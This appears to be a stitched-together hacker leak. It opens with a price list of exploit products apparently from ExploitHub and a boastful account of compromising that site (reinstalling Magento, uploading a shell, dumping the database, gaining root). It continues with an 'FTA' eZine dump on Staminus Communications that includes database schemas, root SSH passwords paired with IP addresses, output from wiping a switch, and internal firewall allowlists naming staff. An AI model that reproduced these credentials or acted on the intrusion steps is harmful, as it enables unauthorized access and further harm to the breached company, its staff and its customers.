GoodTech SSH FXP_OPEN Buffer Overflow,100.0000,2012-03-12 15:00:07,""60"",Mario
MPlayer SAMI Subtitle File Buffer Overflow,100.0000,2012-03-16 17:09:27,""60"",Mario
Internet Explorer 8 Insecure Library Loading Client-Side Remote Code Execution,300.0000,2012-03-22 18:17:19,""422"",41.w4r10r
Novell ZENworks CM Preboot Service Opcode 6 Buffer Overflow,100.0000,2012-03-26 21:26:02,""60"",Mario
Elastix PBX 2.2.0 callme_page.php Remote Command Execution with Local Privilege Escalation,1100.0000,2012-04-22 22:02:07,""423"",aisg-001
Novell ZENworks CM Preboot Service Opcode 21 Buffer Overflow,100.0000,2012-03-27 01:57:07,""60"",Mario
CA Total Defense Suite exportReport Stored Procedu re SQL Injection,100.0000,2012-03-28 12:19:24,""60"",Mario
PEiD PE Import Directory Buffer Overflow,100.0000,2012-03-30 18:52:33,""60"",Mario
Novell ZENworks CM Preboot Service Opcode 4C Buffer Overflow,100.0000,2012-04-04 11:47:52,""60"",Mario
LANDesk Lenovo ThinkManagement Console ServerSetup Command Execution,100.0000,2012-04-04 13:12:02,""60"",Mario
Disk Pulse Server GetServerInfo Buffer Overflow,100.0000,2012-04-10 14:39:53,""60"",Mario
Rabox WinLPD Buffer Overflow,100.0000,2012-04-11 22:18:00,""60"",Mario
Quest Big Brother Remote File Creation,100.0000,2012-04-12 16:28:25,""60"",Mario
SGI Infosrch.cgi fname Command Execution,50.0000,2012-06-13 11:32:36,""60"",Mario
Nucleus Kernel Recovery for Novell Buffer Overflow,100.0000,2012-04-15 14:15:04,""60"",Mario
HP OmniInet.exe Opcode 17 Buffer Overflow,100.0000,2012-04-20 15:17:42,""60"",Mario
HP OmniInet.exe Opcode 35 Buffer Overflow,100.0000,2012-04-21 11:45:56,""60"",Mario
HP OmniInet.exe Opcode 46 Buffer Overflow,100.0000,2012-04-22 12:08:27,""60"",Mario
magicdoc.py,200.0000,2012-12-09 18:10:40,""471"",n0ne
CVE-2011-3402 (MS11-087),1000.0000,2012-07-30 01:12:47,""483"",Ling Chuan Lee
Safari SVGPointList Use-After-Free,500.0000,2012-08-10 14:56:46,""200"",dput
CVE-2005-0750 - Linux Kernel bluetooth integer underflow,500.0000,2012-06-13 08:24:26,""200"",dput
CA BrightStor ARCserve Backup caloggerd Arbitrary File Writing Exploit,500.0000,2012-06-13 08:33:40,""200"",dput
CA BrightStor ARCserve Backup XDR Parsing Buffer Overflow Exploit,500.0000,2012-06-13 08:37:13,""200"",dput
ZABBIX Server node_process_command() Command Execution,50.0000,2012-06-13 12:55:29,""60"",Mario
GlobalSCAPE CuteZIP Buffer Overflow,50.0000,2012-06-13 12:55:29,""60"",Mario
Blue Coat Reporter Directory Traversal Scanner,100.0000,2012-06-16 18:25:44,""114"",bannedit
VMware Workstation VMNC Codec Parsing Remote Code Execution Vulnerability,300.0000,2012-06-24 18:47:21,""490"",exodusintel
WordPress plugin Asset manager upload.php Arbitrary Code Execution,25.0000,2012-06-27 12:37:03,""491"",Sooraj
WordPress plugin WP-Property uploadify.php Arbitrary Code Execution,25.0000,2012-06-27 12:44:25,""491"",Sooraj
GoodTech SSH Server 6.5 Stack Buffer Overflow,100.0000,2012-07-13 14:00:02,""280"",James
PEiD <= 0.92 Stack Buffer Overflow,100.0000,2012-07-13 14:02:52,""280"",James
Cisco Linksys PlayerPT SetSource() ActiveX Buffer Overflow,25.0000,2012-07-20 14:47:20,""60"",Mario
IBM Cognos tm1admsd.exe Buffer Overflow,50.0000,2012-07-23 15:50:37,""60"",Mario
IBM Cognos tm1admsd.exe Buffer Overflow,50.0000,2012-07-23 15:53:19,""60"",Mario
Novell ZENworks Asset Management Remote Code Execution,100.0000,2012-07-27 21:13:03,""60"",Mario
ACDSee Photo Editor 2008 XBM Variable Name Buffer Overflow,100.0000,2012-07-29 19:31:30,""280"",James
Cytel Studio 9.0 (CYB File) Stack Buffer Overflow,100.0000,2012-07-29 19:33:49,""280"",James
Disk Pulse Server 'GetServerInfo' Buffer Overflow,100.0000,2012-07-29 19:36:04,""280"",James
eSignal Pro <= 10.6.2425.1208 (QUO File) Buffer Overflow,100.0000,2012-07-30 02:34:47,""280"",James
FreeSSHD <= 1.2.1 FXP_OPENDIR,100.0000,2012-07-29 19:39:39,""280"",James
FreeSSHD <= 1.2.1 FXP_RENAME,100.0000,2012-07-29 19:41:32,""280"",James
R4 winamp plugin ,100.0000,2012-09-05 14:49:43,""280"",James
Solarwinds <= 5.1.2 LoginServlet Auth Bypass SQLi,100.0000,2012-07-29 19:48:49,""280"",James
Winamp 5.55 (MAKI script) Stack Buffer Overflow,50.0000,2012-07-29 19:50:30,""280"",James
Internet Explorer <=9 Remote Code Execution,700.0000,2012-08-03 15:47:02,""422"",41.w4r10r
IBM Lotus Quickr QP2 ActiveX Import_Times Buffer Overflow,25.0000,2012-08-04 15:52:19,""60"",Mario
IBM Lotus Quickr QP2 ActiveX Attachment_Times Buffer Overflow,25.0000,2012-08-04 15:54:25,""60"",Mario
Oracle Jinitiator beans.ocx ActiveX Control Stack Overflow,150.0000,2012-08-23 08:49:42,""495"",aushack
Oracle Business Transaction Management FlashTunnelService WriteToFile Code Execution,50.0000,2012-08-28 11:34:34,""60"",Mario
HP SiteScope SOAP getFileInternal Arbitrary File Read,25.0000,2012-09-05 17:25:12,""60"",Mario
HP SiteScope SOAP loadFileContent Arbitrary File Read,25.0000,2012-09-05 17:27:32,""60"",Mario
Oracle Outside In XPM Buffer Overflow,25.0000,2012-09-14 17:19:19,""60"",Mario
Oracle Solaris Privilege Escalation,100.0000,2012-10-24 00:00:09,""517"",unSecurityResearch
Novell GroupWise Client 8.0.0 - 2012 - LWP Attachment Buffer Overflow,270.0000,2012-11-04 12:57:57,""79"",alino
IBM Informix Dynamic Server Password Buffer Overflow,50.0000,2012-10-19 22:31:49,""60"",Mario
MySQL on Windows Remote system Exploit post-auth,1500.0000,2012-11-30 19:59:49,""58"",Kingcope
Webmin Status Remote Perl Command/Library Execution,500.0000,2012-11-01 03:32:45,""423"",aisg-001
Webmin Show CGI Remote Command Execution,500.0000,2012-11-01 03:47:37,""423"",aisg-001
Cisco Prime Data Center Network Manager Remote Command Execution,25.0000,2012-11-05 17:24:01,""60"",Mario
McAfee Web Reporter File Upload and Execute,25.0000,2012-11-06 19:47:19,""60"",Mario
SGI infosrch.cgi fname Command Execution,0.0000,2012-11-16 19:28:32,""528"",test
Secure Computing SmartFilter File Upload and Execute,25.0000,2012-11-12 14:21:23,""60"",Mario
supplementary,0.0000,2012-11-17 14:35:35,""528"",test
Site License Plus,0.0000,2012-11-19 13:33:35,"""",
TEST_LIVE,0.0000,2012-11-19 20:20:39,""528"",test
Test Product Live #999,150.0000,2012-11-21 21:59:16,""528"",test
XAMPP mssql_connect() Buffer Overflow,25.0000,2012-11-26 15:37:20,""60"",Mario
Test Product Live #888,80.0000,2012-11-25 21:11:43,""528"",test
Test Product Live #887,70.0000,2012-11-25 17:27:00,""528"",test
Test Product Live #885,69.0000,2012-11-25 18:29:47,""528"",test
jose_test,0.0000,2012-12-07 20:01:08,""528"",test
Mobile Rifatron DVR web version Authentication-free hack,0.0000,2012-12-09 22:16:28,""593"",Renard
MsOfficeWord2010,200.0000,2012-12-09 18:27:37,""471"",n0ne



                  .-'''/.\
How to hack??    (_.--'  |
                  |  ==  |
             o-._ .--..--. _.-o    [+] System Linux web 2.6.35-22-server #33-Ubuntu SMP Sun Sep 19 20:48:58 UTC 2010 x86_64
                 |   ||   |        [+] MYSQL Client API library version 5.1.49 
                  ;--|`--:         [+] Apache Version Apache/2.2.16 (Ubuntu) 
                  |. |   |         [+] Hostname:Port web.lab.nsslabs.com:443 
                  |  ;_ .|         [+] Host www.exploithub.com 
                  |_____ |         [+] X-Powered-By PHP/5.3.3-1ubuntu9.3 
                 /|     '|\
                 //`----'\\
                ////|  |  \\
                /   |  |    \
                   /|  |\
                  / \  / \
                 /   \/   \
                /          \
                |          |
               ||    /\    ||
               ||   ,  .   ||

-----------------------------------------------------------

I am very much surprised when he learned of Magento eCommerce Software and search /install/ 

1) We scan server and site
2) We reinstall Magento CMS https://www.exploithub.com/install/  <= We reinstall Magento CMS
3) Upload shell and phpinfo https://www.exploithub.com/phpinfo.php
4) backup all files and database.
5) Upload piece of the database https://www.exploithub.com/export/
6) Increased privileges and use root


We have exploithub.com private database and FTP files)

               \'/
             -= * =-
               {.}
              {.-'}
             {`_.-'}
            {-` _.-'}
             `"":=:""`
              `---`

--------------------------------------------------------------------------------------
                                   Be safe, / r0073r
								   
    Who is involved in a conspiracy against liberty, must be destroyed.
                         _==_ _
                       _,("",)|_|
                        \/. \-|
                      __( :  )|___
-------Th3 END----------------------Merry Christmas-------------------------------------"
Papers,FUCK THEM ALL (FTA) - Staminus Communications,eZine,,2016-03-11,: ,"/$$$$$$$$ /$$   /$$  /$$$$$$  /$$   /$$       /$$ /$$$$$$$$ /$$      /$$        /$$$$$$  /$$       /$$      
 | $$_____/| $$  | $$ /$$__  $$| $$  /$$/      | $/| $$_____/| $$$    /$$$       /$$__  $$| $$      | $$      
 | $$      | $$  | $$| $$  \__/| $$ /$$/       |_/ | $$      | $$$$  /$$$$      | $$  \ $$| $$      | $$      
 | $$$$$   | $$  | $$| $$      | $$$$$/            | $$$$$   | $$ $$/$$ $$      | $$$$$$$$| $$      | $$      
 | $$__/   | $$  | $$| $$      | $$  $$            | $$__/   | $$  $$$| $$      | $$__  $$| $$      | $$      
 | $$      | $$  | $$| $$    $$| $$\  $$           | $$      | $$\  $ | $$      | $$  | $$| $$      | $$      
 | $$      |  $$$$$$/|  $$$$$$/| $$ \  $$          | $$$$$$$$| $$ \/  | $$      | $$  | $$| $$$$$$$$| $$$$$$$$
 |__/       \______/  \______/ |__/  \__/          |________/|__/     |__/      |__/  |__/|________/|________/

~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~FTA~

  ~[CTRL-C]~ PREFACE
  
    ""fuck"":(third-person singular simple present fucks, present participle fucking, simple past and past participle fucked)
	
		- (vulgar, colloquial, often obscene) To have sexual intercourse, to copulate
			""Fighting for peace is like fucking for virginity.""
			
		- (vulgar, colloquial) To put in an extremely difficult or impossible situation.
			""I'm afraid they're gonna fuck you on this one.""

███████╗████████╗ █████╗ ███╗   ███╗██╗███╗   ██╗██╗   ██╗███████╗
██╔════╝╚══██╔══╝██╔══██╗████╗ ████║██║████╗  ██║██║   ██║██╔════╝
███████╗   ██║   ███████║██╔████╔██║██║██╔██╗ ██║██║   ██║███████╗
╚════██║   ██║   ██╔══██║██║╚██╔╝██║██║██║╚██╗██║██║   ██║╚════██║
███████║   ██║   ██║  ██║██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝███████║
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝
                            ""Bring it on baby""

  ~[CTRL-D]~ STAMINUS
         
        TIPS WHEN RUNNING A SECURITY COMPANY:
                ~ Use one root password for all the boxes
                ~ Expose PDU's to WAN with telnet auth
                ~ Never patch, upgrade or audit the stack
                ~ Disregard PDO as inconvenient
                ~ Hedge entire business on security theatre
                ~ Store full credit card info in plaintext
                ~ Write all code with wreckless abandon

    Database: staminus2
    [185 tables]
    +------------------------------+
    | GOBIG_capture                |
    | GOBIG_global_defaults        |
    | GOBIG_group                  |
    | GOBIG_ip                     |
    | GOBIG_ip_account             |
    | GOBIG_landing                |
    | GOBIG_marketing              |
    | GOBIG_vpn                    |
    | GOBIG_wifi_router            |
    | GOBIG_wifi_router_account    |
    | GOBIG_wifi_router_inventory  |
    | ZONE_backend                 |
    | ZONE_domain                  |
    | ZONE_feature                 |
    | ZONE_feature_main            |
    | ZONE_feature_package         |
    | ZONE_feature_site            |
    | ZONE_frontend                |
    | ZONE_ip                      |
    | ZONE_main                    |
    | ZONE_ns                      |
    | ZONE_package                 |
    | ZONE_queue                   |
    | ZONE_site                    |
    | ZONE_sp                      |
    | session                      |
    | user                         |
    | abuse_stats                  |
    | account                      |
    | account_information          |
    | account_server               |
    | acknowledgeLog               |
    | actionLog                    |
    | active_db                    |
    | addon                        |
    | api                          |
    | appliance                    |
    | appliance_action_log         |
    | appliance_group              |
    | appliance_group_actions      |
    | appliance_group_names        |
    | appliance_lan                |
    | appliance_log                |
    | bgp_advertise_log            |
    | bgp_info                     |
    | bgp_tunnel_info              |
    | billing                      |
    | billing_array                |
    | billing_detail               |
    | billing_onapp                |
    | billing_server               |
    | bundle_ip                    |
    | bw_track                     |
    | bw_usage                     |
    | cancel_reason                |
    | ccbilling                    |
    | clean_graph_map              |
    | cloud_ip_map                 |
    | config                       |
    | contract_info                |
    | coupon                       |
    | credit_card                  |
    | ddos_historical_data         |
    | ddos_report                  |
    | ddos_report_details          |
    | denied_order                 |
    | dynamic_protected            |
    | email_queue                  |
    | email_subscription           |
    | email_template               |
    | flowNullConfig               |
    | flowStats                    |
    | geoip_country_blocks         |
    | geoip_country_locations      |
    | geoip_country_whois          |
    | gig_hour_usage_history       |
    | gighour_usage                |
    | huawei_cleaning              |
    | huawei_requests              |
    | huawei_requests_log          |
    | ip_limit                     |
    | ip_limit_history             |
    | ip_limit_profile             |
    | ip_limit_profiles            |
    | ipmi_ip                      |
    | lan_subnet                   |
    | loginLog                     |
    | max_mind_results             |
    | motd                         |
    | msg_communication            |
    | nextip                       |
    | nullroute_report             |
    | nullroutes                   |
    | number_of_ips                |
    | oauth_access_tokens          |
    | oauth_authorization_codes    |
    | oauth_clients                |
    | oauth_jwt                    |
    | oauth_refresh_tokens         |
    | oauth_scopes                 |
    | oauth_users                  |
    | page_hiding                  |
    | page_hiding_pages            |
    | promotion                    |
    | promotion_landing            |
    | promotion_stock              |
    | protect_log                  |
    | queue                        |
    | rating_banlist               |
    | rating_details               |
    | rating_settings              |
    | rating_summary               |
    | raw_log                      |
    | restore_lansubnet            |
    | restore_serverip             |
    | router_monitor               |
    | run_rate_historical_data     |
    | scloud                       |
    | scloud_backend               |
    | scloud_backend_options       |
    | scloud_backend_variables     |
    | scloud_frontend              |
    | scloud_frontend_options      |
    | secureport                   |
    | secureport20150629           |
    | secureport_active_baseline   |
    | secureport_entry             |
    | secureport_gighour           |
    | secureport_profile           |
    | secureport_profiles          |
    | secureport_restore1          |
    | secureport_restore2          |
    | secureport_states            |
    | secureport_states_exempt     |
    | secureport_states_syn        |
    | secureport_static_whitelist  |
    | secureport_whitelist         |
    | secureportfoo                |
    | server                       |
    | server_addon                 |
    | server_ddos_report           |
    | server_firewall              |
    | server_ip                    |
    | server_ip6                   |
    | server_map                   |
    | server_monitor               |
    | server_price_historical_data |
    | service_request              |
    | shipping_log                 |
    | short_term_block_log         |
    | signup                       |
    | slow_egress                  |
    | staff                        |
    | staff_block                  |
    | staff_push                   |
    | staff_queue                  |
    | static_bypass                |
    | static_protected             |
    | stock                        |
    | stock_compatible_addon       |
    | swip                         |
    | ticket                       |
    | ticket_message               |
    | ticket_queue                 |
    | ticket_server                |
    | ticket_staff_message         |
    | ticket_statistics_data       |
    | traffic_block                |
    | traffic_live                 |
    | traffic_live_global          |
    | traffic_live_server          |
    | traffic_report               |
    | traffic_report_entry         |
    | tunnel_info                  |
    | udp_block                    |
    | whitelist_ip                 |
    | work_order                   |
    | work_order_addon             |
    | work_order_available_options |
    | work_order_message           |
    | work_order_option            |
    | work_order_server            |
    | work_order_staff             |
    | work_order_ticket            |
    | work_order_type              |
    +------------------------------+
	
	mysql> mysql> select * from appliance;
	+----+----------+-------------------+------------+---------+----------------+-----------------+----------------+-------------+-------------+
	| ID | serverID | name              | hostname   | groupID | ip             | netmask         | gateway        | peerIP      | md5password |
	+----+----------+-------------------+------------+---------+----------------+-----------------+----------------+-------------+-------------+
	| 11 |   200014 | Leonardo          | sec01-via1 |       9 | 216.46.165.2   | 255.255.255.252 | 216.46.165.1   | 74.63.128.9 | qYaENLr3    |
	| 13 |   200015 | sec02-via1        | sec02-via1 |       9 | 216.24.132.254 | 255.255.255.252 | 216.24.132.253 | 74.63.128.9 | qYaENLr3    |
	| 15 |   200016 | sec03-via1        | sec03-via1 |       9 | 206.71.66.2    | 255.255.255.252 | 206.71.66.1    | 74.63.128.9 | qYaENLr3    |
	| 17 |   200017 | sec04-via1        | sec04-via1 |       9 | 216.46.191.202 | 255.255.255.252 | 216.46.191.201 | 74.63.128.9 | qYaENLr3    |
	| 19 |   200001 | 87751-MON01.SLC04 | NULL       |       9 | 204.246.136.86 | 255.255.255.252 | 204.246.136.85 | NULL        | NULL        |
	| 21 |   200002 | 87751-MON01.DAL01 | NULL       |       9 | 66.205.176.154 | 255.255.255.252 | 66.205.176.153 | NULL        | NULL        |
	| 23 |   200003 | 87751-MON01.LAS04 | NULL       |       9 | 209.170.203.74 | 255.255.255.252 | 209.170.203.73 | NULL        | NULL        |
	| 25 |   200004 | 87751-MON01.MSP01 | NULL       |       9 | 209.236.97.130 | 255.255.255.252 | 209.236.97.129 | NULL        | NULL        |
	| 27 |   200005 | 87751-MON01.PHX01 | NULL       |       9 | 76.9.185.162   | 255.255.255.252 | 76.9.185.161   | NULL        | NULL        |
	| 29 |   200006 | 87751-MON01.PDX01 | NULL       |       9 | 207.189.98.18  | 255.255.255.252 | 207.189.98.17  | NULL        | NULL        |
	| 31 |   200007 | 87751-MON01.SLC07 | NULL       |       9 | 66.133.96.2    | 255.255.255.252 | 66.133.96.1    | NULL        | NULL        |
	| 32 |   200020 | MON01-NAC         | sec01-nac1 |      14 | 207.99.107.6   | 255.255.255.252 | 207.99.107.5   | NULL        | NULL        |
	| 38 |   200021 | MON02-NAC         | sec02-nac1 |      14 | 207.99.112.174 | 255.255.255.252 | 207.99.112.173 | NULL        | NULL        |
	| 44 |   200022 | MON03-NAC         | sec03-nac1 |      14 | 207.99.113.102 | 255.255.255.252 | 207.99.113.101 | NULL        | NULL        |
	+----+----------+-------------------+------------+---------+----------------+-----------------+----------------+-------------+-------------+
	14 rows in set (0.00 sec)
	
	mysql> describe credit_card;
	+-----------+------------------+------+-----+---------+----------------+
	| Field     | Type             | Null | Key | Default | Extra          |
	+-----------+------------------+------+-----+---------+----------------+
	| ID        | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
	| accountID | varchar(100)     | NO   | MUL | NULL    |                |
	| firstName | varchar(30)      | YES  |     | NULL    |                |
	| lastName  | varchar(30)      | YES  |     | NULL    |                |
	| number    | varchar(17)      | NO   |     | NULL    |                |
	| expMonth  | int(2)           | NO   |     | NULL    |                |
	| expYear   | int(4)           | NO   |     | NULL    |                |
	| validated | int(1)           | YES  |     | 0       |                |
	| main      | int(1)           | YES  |     | 0       |                |
	| cvv       | varchar(10)      | YES  |     | NULL    |                |
	+-----------+------------------+------+-----+---------+----------------+
	10 rows in set (0.00 sec)
	
	:: SAMPLE ::
	
	[""SPCHECK""    spcheck     ssh:104.131.132.49 ]:root:St4m|nu5
	[""VM HOST""    cl08-irv1   ssh:72.8.154.8     ]:root:St4m|nu5
	[""MOTHERLOAD"" apitest     ssh:69.197.35.134  ]:root:St4m|nu5
	[""CHATBOT""    chatbot     ssh:69.197.35.133  ]:root:St4m|nu5
	[""backup01-s3073-cab38-ocloud-irv1"" ssh:69.197.40.229]:root:St4m|nu5
	[""ams2""                   ssh:176.56.238.205 ]:root:St4m|nu5
	[""proxweb""                ssh:72.8.128.4]:root:St4m|nu5
	[""smb01-irv1""             ssh:72.8.128.34]:root:St4m|nu5
	[""kkk""                    ssh:69.197.31.193]:root:TkBNk7TdrSh2Uq42
	[""puppet-agent""           ssh:199.192.78.210]:root:St4m|nu5

	:: SAMPLE ::
	
	Formatting bootflash: ...
	Format of bootflash complete
	Erasing nvram:
	Erasing cat4000_flash:
	Clearing crashinfo:data
	Clearing the last power failure timestamp
	Clearing all ROMMON variables
	Setting default ROMMON variables:
		ConfigReg=0x2101
		PS1=rommon ! >
		EnableAutoConfig=1
	Setting vtp mode to transparent
	%WARNING! Please reboot the system for the changes to take effect
	aggr2.irv1#reset
	
    OURNETS=""72.20.0.0/18 69.197.0.0/18 72.8.128.0/18 199.192.72.0/21""
    RFC1918=""10.0.0.0/8 192.168.0.0/16""
    LOCAL=""127.0.0.0/8""

    ## External (people or resources)
    JOHN_ALLOW=""216.114.66.22 65.110.55.179 63.246.134.202 69.26.161.38 72.20.10.253 162.230.6.44 162.230.6.45""
    HASSAN_ALLOW=""72.8.154.80 41.130.32.164 72.8.154.79""
    EUGENE_ALLOW=""66.228.39.208 199.192.76.90""
    ONAPP_ALLOW=""83.170.70.4 69.72.249.232""
    CYBERSOURCE_ALLOW=""66.185.176.0/20""
    JEFF_ALLOW=""209.44.125.0/28 205.204.94.18 69.197.35.154 69.197.38.80/28""
    MATT_ALLOW=""70.169.227.248 99.46.104.171""
    ARAD_ALLOW=""174.67.216.146""
    ERIC_HO_ALLOW=""76.216.235.9 70.181.119.63 68.15.73.170 68.170.67.222""
    EXTERNAL_VPN_ALLOW=""72.8.128.35""


    ## Set our main allow variable
    ALLOW=""""

    ## Global allows
    ALLOW_MAIN=""""
    ALLOW_MAIN=""$ALLOW_MAIN $RFC1918 $LOCAL""
    ALLOW_MAIN=""$ALLOW_MAIN 72.20.1.2 72.20.0.0/24 69.197.1.0/24""   # Internal
    ALLOW_MAIN=""$ALLOW_MAIN 199.241.199.0/24"";                      # IB AMS1
    ALLOW_MAIN=""$ALLOW_MAIN 199.241.198.0/24"";                      # IB NYC1
    ALLOW_MAIN=""$ALLOW_MAIN 162.220.32.62"";                 # IB NYC1 ATRATO
    ALLOW_MAIN=""$ALLOW_MAIN 199.241.197.0/24"";                      # IB LAX1
    ALLOW_MAIN=""$ALLOW_MAIN 199.241.196.0/24"";                      # IB LAX2
    ALLOW_MAIN=""$ALLOW_MAIN 69.197.3.204 69.197.3.205 69.197.3.206"" # IB IRV1
    ALLOW=""$ALLOW $ALLOW_MAIN""

    ## OOB
    ALLOW_OOB=""""
    ALLOW_OOB=""$ALLOW_OOB 98.189.83.123"";                           # OOB Irvine
    ALLOW_OOB=""$ALLOW_OOB 207.166.140.0/29"";                        # OOB Coresite
    ALLOW_OOB=""$ALLOW_OOB 198.24.32.82"";                            # OOB NYC1
    ALLOW_OOB=""$ALLOW_OOB 213.52.181.178"";                          # OOB AMS1
    ALLOW_OOB=""$ALLOW_OOB 66.128.156.60"";                           # OOB LAX2
    ALLOW=""$ALLOW $ALLOW_OOB""

    ## Comm
    ALLOW_COMM=""""
    ALLOW_COMM=""$ALLOW_COMM $MATT_ALLOW $ARAD_ALLOW $EUGENE_ALLOW""
    ALLOW_COMM=""$ALLOW_COMM 4.2.2.1 8.8.8.8""                        # DNS
    ALLOW_COMM=""$ALLOW_COMM 18.7.21.144 66.241.101.63""              # TIME
    ALLOW_COMM=""$ALLOW_COMM 69.197.63.142""                          # IRV1 LAN
    ALLOW_COMM=""$ALLOW_COMM 72.20.22.29""                            # LAX1 WIFI
    ALLOW_COMM=""$ALLOW_COMM 72.20.55.32/29""                         # VPN
    ALLOW=""$ALLOW $ALLOW_COMM""

    ## Routers / Bridges / SP
    ALLOW_ROUTER=""""
    ALLOW_ROUTER=""$ALLOW_ROUTER 224.0.0.0/8""                # Multicast / OSPF
    ALLOW=""$ALLOW $ALLOW_ROUTER""

    ## Core servers


    ## SNMP Pulling to a specific server also goes here
    ALLOW_CORE=""""
    ALLOW_CORE=""$ALLOW_CORE 72.8.154.76""                    # staffwiki
    ALLOW_CORE=""$ALLOW_CORE 72.8.154.85""                    # captive-portal
    ALLOW_CORE=""$ALLOW_CORE 72.8.157.186""                   # intrepid multicraft
    ALLOW_CORE=""$ALLOW_CORE 72.8.154.76""                    # staffwiki
    ALLOW_CORE=""$ALLOW_CORE 72.8.154.91""                    # web02-irv1
    ALLOW_CORE=""$ALLOW_CORE 72.20.10.78""                    # web03-irv1
    ALLOW_CORE=""$ALLOW_CORE 72.8.156.176""                   # web03-lax1
    ALLOW_CORE=""$ALLOW_CORE 72.8.128.34""                    # smb01-irv1
    ALLOW_CORE=""$ALLOW_CORE 69.197.32.75""                   # intreppid web
    ALLOW_CORE=""$ALLOW_CORE 72.8.183.206""                   # web01-int-irv1.intreppid
    ALLOW_CORE=""$ALLOW_CORE 69.197.35.55""                   # public wiki
    ALLOW_CORE=""$ALLOW_CORE 72.8.154.71""                    # dev01-irv1
    ALLOW_CORE=""$ALLOW_CORE 72.8.154.89""                    # dev02-irv1
    ALLOW_CORE=""$ALLOW_CORE 72.8.154.66""                    # sql01-irv1
    ALLOW_CORE=""$ALLOW_CORE 72.8.156.175""                   # sql02-irv1
    ALLOW_CORE=""$ALLOW_CORE 72.8.154.69""                    # mx01-irv1
    ALLOW_CORE=""$ALLOW_CORE 72.20.26.125""                   # Staminus Webserver vhosts
    ALLOW_CORE=""$ALLOW_CORE 69.197.58.67""                   # www.staminus.net
    ALLOW_CORE=""$ALLOW_CORE 72.20.5.98""                     # captcha01-irv1
    ALLOW_CORE=""$ALLOW_CORE 199.241.197.97""                 # bbgre01-lax1
    ALLOW_CORE=""$ALLOW_CORE 199.241.198.15""                 # bbgre01-nyc1
    ALLOW_CORE=""$ALLOW_CORE 199.241.199.15""                 # bbgre01-ams1
    ALLOW_CORE=""$ALLOW_CORE 72.8.156.130""                   # gre01-lax1
    ALLOW_CORE=""$ALLOW_CORE 72.8.156.174""                   # gre02-lax1
    ALLOW_CORE=""$ALLOW_CORE 72.8.156.131""                   # cache01-lax1
    ALLOW_CORE=""$ALLOW_CORE 72.8.156.162""                   # jmp01-lax1
    ALLOW_CORE=""$ALLOW_CORE 72.20.9.2""                      # jmp01-lax2
    ALLOW_CORE=""$ALLOW_CORE 72.8.154.75""                    # jmp01-irv1
    ALLOW_CORE=""$ALLOW_CORE 72.8.154.72""                    # ldap01-irv1
    ALLOW_CORE=""$ALLOW_CORE 69.197.63.150""                  # manage01-irv1
    ALLOW_CORE=""$ALLOW_CORE 66.241.102.86""                  # monitor-vitelity
    ALLOW_CORE=""$ALLOW_CORE 66.241.100.79""                  # cacti-vitelity
    ALLOW_CORE=""$ALLOW_CORE 72.8.154.95/32 72.20.53.2""      # cacti-irv1
    ALLOW_CORE=""$ALLOW_CORE 199.241.198.141""                # cacti01-nyc1
    ALLOW_CORE=""$ALLOW_CORE 199.241.199.146""                # cacti01-nyc1
    ALLOW_CORE=""$ALLOW_CORE 66.241.106.77""                  # pbx1-dnv1
    ALLOW_CORE=""$ALLOW_CORE 72.20.40.1 72.20.40.102""        # NFS
    ALLOW_CORE=""$ALLOW_CORE 69.197.61.80/29""                # LB 10G Subnet
    ALLOW_CORE=""$ALLOW_CORE 72.8.154.87""                    # nagios-irv1
    ALLOW_CORE=""$ALLOW_CORE 72.8.154.95""                    # cacti-irv1
    ALLOW_CORE=""$ALLOW_CORE 72.8.156.152"";                  # backup01-lax1
    ALLOW_CORE=""$ALLOW_CORE 69.197.35.178"";                 # infrasvn01-irv1
    ALLOW_CORE=""$ALLOW_CORE 69.197.35.249"";                 # push01-irv1
    ALLOW_CORE=""$ALLOW_CORE 69.197.35.158"";                 # push02-irv1
    ALLOW_CORE=""$ALLOW_CORE 69.197.35.150"";                 # nfs02-irv1
    ALLOW_CORE=""$ALLOW_CORE 69.197.2.34"";                   # sniff-cab26-irv1
    ALLOW_CORE=""$ALLOW_CORE 69.197.63.150"";                 # sniff-cab0-irv1
    #ALLOW_CORE=""$ALLOW_CORE 72.8.128.6"";                   # pxc01-irv1
    #ALLOW_CORE=""$ALLOW_CORE 72.8.128.7"";                   # pxc02-irv1
    #ALLOW_CORE=""$ALLOW_CORE 72.8.152.20"";                  # pxc01-lax1
    ALLOW=""$ALLOW $ALLOW_CORE""


    ## Useful because these are our common servers that we want allowed everywhere
    ALLOW_BASE1=""$ALLOW_MAIN $ALLOW_OOB $ALLOW_COMM $ALLOW_CORE""

    ## Infrastucture SVN does not need to allow any access to it other than below
    ALLOW_BASE2=""$ALLOW_MAIN $ALLOW_OOB $ALLOW_COMM""

    ## Other Servers
    ALLOW_SRV=""""
    ALLOW_SRV=""$ALLOW_SRV 72.8.154.74 72.20.27.29""          # IRV1 SURV1
    ALLOW=""$ALLOW $ALLOW_SRV""

    ## Physical Infrastructure
    ALLOW_INFRA=""""
    ALLOW_INFRA=""$ALLOW_INFRA 72.8.189.128/25""                      # IRV1 APC PDUs
    ALLOW_INFRA=""$ALLOW_INFRA 72.8.144.0/25""                        # IRV1 APC PDUs
    ALLOW_INFRA=""$ALLOW_INFRA 72.20.39.208/28""                      # APC 1W SUITE 805 AA03/AA04/AA05
    ALLOW=""$ALLOW $ALLOW_INFRA""

    ## Management
    ALLOW_MANAGE=""""
    ALLOW_MANAGE=""$ALLOW_MANAGE 72.8.158.128/26 69.197.23.32/28""    # IRV1 RAR
    ALLOW_MANAGE=""$ALLOW_MANAGE 72.8.143.0/25""                      # IRV1 RAR
    ALLOW_MANAGE=""$ALLOW_MANAGE 72.20.54.58""                        # rar1.irv1
    ALLOW_MANAGE=""$ALLOW_MANAGE 72.20.54.62""                        # rar2.irv1
    ALLOW_MANAGE=""$ALLOW_MANAGE 72.20.38.174""                       # IPKVM
    ALLOW_MANAGE=""$ALLOW_MANAGE 72.20.39.174""                       # Spider IPKVM
    # lax1 and lax2 raritans defined in other subnets
    ALLOW=""$ALLOW $ALLOW_MANAGE""

    ## No idea what this is.  One of these subnets is now customer allocated.  I can't find them reserved in ip.class.
    #ALLOW=""$ALLOW 72.8.131.224/29""                 # LAX2 C1 MANAGEMENT
